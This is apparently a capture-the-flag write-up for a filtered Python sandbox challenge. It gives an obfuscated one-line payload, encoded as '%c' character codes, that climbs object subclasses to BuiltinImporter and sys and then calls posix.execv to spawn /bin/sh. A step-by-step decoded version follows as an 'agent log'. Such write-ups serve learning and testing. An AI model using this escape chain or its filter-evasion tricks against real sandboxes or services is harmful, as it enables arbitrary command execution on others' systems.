
# Solution

```
((G:=None.__new__.__self__.__getattribute__),(C:=G((),'%c%c%c%c%c%c%c%c%c'%(95,95,99,108,97,115,115,95,95))),(B:=G(C,'%c%c%c%c%c%c%c%c'%(95,95,98,97,115,101,95,95))),(S:=G(B,'%c%c%c%c%c%c%c%c%c%c%c%c%c%c'%(95,95,115,117,98,99,108,97,115,115,101,115,95,95))()),(P:=S.pop(65+66)),(LM:=G(P,'%c%c%c%c%c%c%c%c%c%c%c'%(108,111,97,100,95,109,111,100,117,108,101))),(F:=G(LM,'%c%c%c%c%c%c%c%c'%(95,95,102,117,110,99,95,95))),(Gl:=G(F,'%c%c%c%c%c%c%c%c%c%c%c'%(95,95,(51+52),108,111,98,97,108,115,95,95))),(Sy:=Gl.get('%c%c%c'%(115,121,115))),(Md:=G(Sy,'%c%c%c%c%c%c%c'%(109,111,100,117,108,101,115))),(M:=Md.get('%c%c%c%c%c'%(112,111,115,105,120))),G(M,'%c%c%c%c%c'%(101,120,101,99,118))('%c%c%c%c%c%c%c'%(47,98,105,110,47,115,104),('%c%c'%(115,104),)),3)
```

1. Find a gadget chain in python (specific version)


2. Get getattr_func and use '%c'%XXX to generate string

3. Turn normal ssti chain using __getattribute__, .pop and .get to bypass the filter 

Below is the agent log

```
# 1. Get reference to object.__getattribute__ (our universal tool)
getattr_func = object.__getattribute__
# 2. Walk up to 'object' class
tuple_class = getattr_func((), "__class__")      # <class 'tuple'>
object_class = getattr_func(tuple_class, "__base__") # <class 'object'>
# 3. Get all subclasses
subclasses_list = getattr_func(object_class, "__subclasses__")()
# 4. Find BuiltinImporter (index 131)
builtin_importer = subclasses_list[131]
# 5. Access the 'sys' module through BuiltinImporter's internals
load_module_method = getattr_func(builtin_importer, "load_module")
load_module_function = getattr_func(load_module_method, "__func__")
function_globals = getattr_func(load_module_function, "__globals__")
sys_module = function_globals["sys"]
# 6. Execute shell
posix_module = getattr_func(sys_module, "modules")["posix"]
getattr_func(posix_module, "execv")("/bin/sh", ["sh"])
# 7. Just a number for constraints
3
```